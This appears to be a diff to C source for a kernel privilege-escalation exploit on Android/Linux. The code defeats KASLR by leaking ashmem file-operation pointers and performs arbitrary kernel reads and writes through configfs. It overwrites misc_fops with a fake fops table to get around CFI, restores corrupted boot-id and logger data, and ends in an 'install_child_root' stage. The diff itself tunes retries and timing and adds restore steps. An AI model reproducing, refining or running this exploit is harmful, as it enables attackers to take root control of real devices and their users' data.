@@ -1,6 +1,6 @@
 #include "common.h"
 
-#define PSELECT_CFI_ROUTE_ATTEMPTS 24
+#define PSELECT_CFI_ROUTE_ATTEMPTS 1
 
 atomic_int cfi_stage_done;
 ssize_t cfi_write_ret = -1;
@@ -35,6 +35,15 @@ uint64_t slide_bootid_want;
 ssize_t slide_bootid_restore_ret = -1;
 
 static int route_delay_usec(int attempt) {
+  const char *forced = getenv("PSELECT_DELAY_USEC");
+  if (forced && *forced) {
+    char *end = NULL;
+    errno = 0;
+    long value = strtol(forced, &end, 0);
+    if (!errno && end != forced && !*end && value >= 0 && value <= 1000000) {
+      return (int)value;
+    }
+  }
   static const int delays[] = {
     50000, 30000, 70000, 10000, 100000, 150000, 20000, 120000,
   };
@@ -168,7 +177,7 @@ void do_pselect_fake_lock_route(void) {
     close(pipefd[0]);
     close(pipefd[1]);
 
-    if (route_verified || cfi_dirty_seen || !route_signal) {
+    if (route_verified || cfi_dirty_seen) {
       break;
     }
     pr_info("pselect cfi miss attempt=%d/%d step=%d errno=%d; refreshing FOPS page\n",
@@ -218,7 +227,7 @@ int refresh_fake_fops_text(int fd) {
 }
 
 int leak_kernel_base(int fd) {
-  kaslr_fops_alias = p0_data_alias(ASHMEM_FOPS);
+  kaslr_fops_alias = data_addr(ASHMEM_FOPS);
   kaslr_open_ptr = kernel_read64(fd, kaslr_fops_alias + FOPS_OPEN_OFF);
   kaslr_ioctl_ptr = kernel_read64(fd, kaslr_fops_alias + FOPS_IOCTL_OFF);
   kaslr_mmap_ptr = kernel_read64(fd, kaslr_fops_alias + FOPS_MMAP_OFF);
@@ -261,7 +270,7 @@ int leak_kernel_base(int fd) {
 }
 
 int restore_slide_boot_id(int fd) {
-  uintptr_t boot_id_data = SLIDE_RANDOM_BOOT_ID_DATA;
+  uintptr_t boot_id_data = SLIDE_RANDOM_BOOT_ID_DATA + slide_p0_offset;
   slide_bootid_want = slide_canon_addr(SLIDE_SYSCTL_BOOTID);
   configfs_read_once(
       fd, boot_id_data, &slide_bootid_before, sizeof(slide_bootid_before));
@@ -276,8 +285,32 @@ int restore_slide_boot_id(int fd) {
           (unsigned long long)slide_bootid_before,
           (unsigned long long)slide_bootid_want,
           (unsigned long long)slide_bootid_after, errno);
-  return slide_bootid_restore_ret == (ssize_t)sizeof(slide_bootid_want) &&
-         slide_bootid_after == slide_bootid_want;
+  int boot_id_restored =
+      slide_bootid_restore_ret == (ssize_t)sizeof(slide_bootid_want) &&
+      slide_bootid_after == slide_bootid_want;
+
+#ifdef SLIDE_RB_PARENT_TYPE_RESTORE
+  uintptr_t parent_type = SLIDE_LOGGERS_0_1 + slide_p0_offset +
+                          sizeof(uint64_t);
+  uint64_t type_before = 0;
+  uint64_t type_after = 0;
+  uint64_t type_want = SLIDE_RB_PARENT_TYPE_RESTORE;
+  configfs_read_once(fd, parent_type, &type_before, sizeof(type_before));
+  ssize_t type_restore_ret =
+      configfs_write_once(fd, parent_type, &type_want, sizeof(type_want));
+  configfs_read_once(fd, parent_type, &type_after, sizeof(type_after));
+  pr_info("slide restore rb parent type pid=%d ret=%zd before=%016llx "
+          "want=%016llx after=%016llx errno=%d\n",
+          getpid(), type_restore_ret,
+          (unsigned long long)type_before,
+          (unsigned long long)type_want,
+          (unsigned long long)type_after, errno);
+  return boot_id_restored &&
+         type_restore_ret == (ssize_t)sizeof(type_want) &&
+         type_after == type_want;
+#else
+  return boot_id_restored;
+#endif
 }
 
 int install_child_root(int fd) {
@@ -301,6 +334,10 @@ int try_cfi_stage(void) {
   ssize_t pre_rb = configfs_read_once(
       fd, misc_fops, &pre_fops, sizeof(pre_fops));
   if (pre_rb != (ssize_t)sizeof(pre_fops) || pre_fops != fake_fops) {
+    pr_warning("cfi misc_fops mismatch ret=%zd target=%016zx "
+               "read=%016llx want=%016zx errno=%d\n",
+               pre_rb, misc_fops, (unsigned long long)pre_fops,
+               fake_fops, errno);
     fops_before = pre_fops;
     cfi_last_step = 4;
     cfi_last_errno = errno;
@@ -356,7 +393,7 @@ int try_cfi_stage(void) {
     goto fail;
   }
 
-  if (!leak_kernel_base(fd)) {
+  if (!kaslr_done) {
     cfi_last_step = 9;
     cfi_last_errno = errno;
     goto fail;
@@ -422,7 +459,7 @@ int try_cfi_stage(void) {
 
 fail:
   if (dirty) {
-    uint64_t original_fops_fail = p0_data_alias(ASHMEM_FOPS);
+    uint64_t original_fops_fail = data_addr(ASHMEM_FOPS);
     if (kaslr_done) {
       original_fops_fail = canon_addr(ASHMEM_FOPS);
     }
